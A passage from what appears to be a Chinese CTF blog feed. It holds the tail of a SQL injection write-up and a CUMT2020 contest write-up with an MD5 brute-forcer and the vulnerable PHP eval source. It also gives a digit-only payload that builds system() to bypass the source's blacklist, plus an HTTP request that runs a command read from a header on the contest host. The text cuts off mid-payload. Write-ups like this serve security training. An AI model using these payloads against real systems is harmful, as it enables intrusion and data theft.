class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">group_concat</span>(a)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">as</span><span class="hljs-comment">/**/</span>a<span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">users</span>)x),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span><span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/17/cjwNtdGaRMoLy1C.png" alt="image-20210117000629293"></p><blockquote><p>此题主要掌握无列名查询与查询表名的新方法</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CUMT2020-岁末赛</title>
    <link href="/2020/12/30/CUMT2020-%E5%B2%81%E6%9C%AB%E8%B5%9B/"/>
    <url>/2020/12/30/CUMT2020-%E5%B2%81%E6%9C%AB%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a><em>WEB</em></h2><h3 id="EZ-JS"><a href="#EZ-JS" class="headerlink" title="EZ_JS"></a>EZ_JS</h3><p><img src="https://i.loli.net/2020/12/24/JOxnP3EmolT1ZD2.png" alt="image-20201224123233716"></p><p><img src="https://i.loli.net/2020/12/24/bkfDQEdh4cHraju.png" alt="image-20201224123259063"></p><p>这里有个好用的颜码解码网站：<a href="https://www.qtool.net/decode">https://www.qtool.net/decode</a></p><a id="more"></a><h3 id="EZ-RCE"><a href="#EZ-RCE" class="headerlink" title="EZ_RCE"></a>EZ_RCE</h3><p>爆破md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1000000000000000000000</span>):<br>    i=str(i)<br>    h=hashlib.md5()<br>    h.update(i.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    a = h.hexdigest()<br>    <span class="hljs-keyword">if</span>( a[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">&quot;7b6db2&quot;</span> ):<br>        print(i)<br>        <span class="hljs-keyword">break</span><br>        <br> //<span class="hljs-number">2708999</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (substr(md5($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>]), <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) === <span class="hljs-string">&quot;7b6db2&quot;</span>) &#123;<br>        $str = $_POST[<span class="hljs-string">&#x27;code&#x27;</span>];<br>        $butaixing = [<span class="hljs-string">&#x27;[a-z]&#x27;</span>,<span class="hljs-string">&#x27;\+&#x27;</span>, <span class="hljs-string">&#x27;[\x7f-\xff]&#x27;</span>, <span class="hljs-string">&#x27;~&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;;&#x27;</span>,<span class="hljs-string">&#x27;\s&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>, <span class="hljs-string">&#x27;\$&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>, <span class="hljs-string">&#x27;\^&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>,<span class="hljs-string">&#x27;&gt;&#x27;</span>];<br>        <span class="hljs-comment">// 没过滤 () . ? 数字 &#123;&#125;  / @ -  _</span><br>        <span class="hljs-keyword">foreach</span> ($butaixing <span class="hljs-keyword">as</span> $item) &#123;<br>            <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . $item . <span class="hljs-string">&#x27;/im&#x27;</span>, $str)) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;臭弟弟，你想干啥？&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span> . $str . <span class="hljs-string">&#x27;;&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>这题是 改的RCTF的一题 , 利用一些神奇的操作获得字母</p></blockquote><p>直接给出payload，后期单独总结</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima"># <span class="hljs-built_in">system</span>(end(getallheaders()))<br>code = ((((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">2</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">2</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">4</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)))(((((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D)%7C(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D)).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))))(((((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">4</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">4</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D)%7C(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">4</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D)%7C(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D)%7C(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">2</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">2</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))))()))<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>:<br><span class="hljs-attribute">POST</span> /?pass=<span class="hljs-number">2708999</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">219.219.61.234:50001</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; WOW<span class="hljs-number">64</span>; rv:<span class="hljs-number">46</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">46</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">DNT</span>: <span class="hljs-number">1</span><br><span class="hljs-attribute">Cookie</span>: PHPSESSID=u<span class="hljs-number">6</span>qctifmhonae<span class="hljs-number">5</span>lp<span class="hljs-number">6</span>h<span class="hljs-number">3</span>n<span class="hljs-number">1</span>e<span class="hljs-number">51</span>ot<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">2106</span><br><span class="hljs-attribute">a</span>: cat /tmp/flag_is_here<br><br><span class="hljs-attribute">code</span>=((((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">2</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">2</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">4</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)))(((((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>.<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D)).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))))(((((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>.<span class="hljs-number">1</span>).(<span 